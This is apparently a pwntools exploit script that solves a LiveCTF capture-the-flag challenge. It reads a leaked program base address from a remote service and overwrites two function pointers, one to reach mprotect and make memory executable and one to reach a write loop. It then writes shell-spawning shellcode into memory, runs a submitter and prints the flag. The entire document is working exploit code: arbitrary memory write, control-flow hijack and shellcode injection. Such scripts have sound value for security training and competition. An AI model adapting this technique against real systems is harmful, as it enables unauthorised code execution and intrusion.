#!/usr/bin/env python3

from pwn import *
import time

context.arch = "amd64"

if True:
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337
    io = remote(HOST, int(PORT))
    p = io
else:
    p = process("./challenge")
    #gdb.attach(p)

def write(where, what):
    p.send(where)
    p.send(what)

shellcode = asm(shellcraft.sh())
if len(shellcode) % 8 != 0:
    shellcode = shellcode + (8 - len(shellcode) % 8) * b"\x00"

prog_base = u64(p.recv(8))
shellcode_addr = prog_base + 0x2158

# replace initSeed by mprotect rwx
write(p64(prog_base + 0x4330), p64(prog_base + 0x1370))
# replace fini by write loop
write(p64(prog_base + 0x4338), p64(prog_base + 0x2000))
p.send(p64(0))

p.send(p64(1))
p.recvuntil(b"Correct!\n")
p.recvn(8)

# write shellcode
for i in range(0, len(shellcode), 8):
    write(p64(shellcode_addr + i), shellcode[i:i+8])
p.send(p64(0))

time.sleep(1)

p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode('charmap').strip()
log.info('Flag: %s', flag)
